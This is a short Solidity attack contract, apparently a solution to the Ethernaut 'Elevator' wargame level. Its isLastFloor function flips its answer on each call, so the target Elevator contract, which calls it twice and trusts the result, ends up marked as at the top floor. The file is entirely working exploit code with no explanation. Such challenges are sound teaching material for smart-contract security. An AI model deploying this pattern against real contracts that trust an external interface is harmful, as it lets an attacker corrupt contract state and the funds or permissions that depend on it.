pragma solidity ^0.6.0;

import "./Elevator.sol";

contract ElevatorAttack {
    bool public toggle = true;
    Elevator public target;
    
    constructor(address _targetAddr) public {
        target = Elevator(_targetAddr);
    }
    
    function isLastFloor(uint) external returns (bool){
        toggle = !toggle;
        return toggle;
    }
    
    function goToTop(uint _floor) public {
        target.goTo(_floor);
    }
    
}
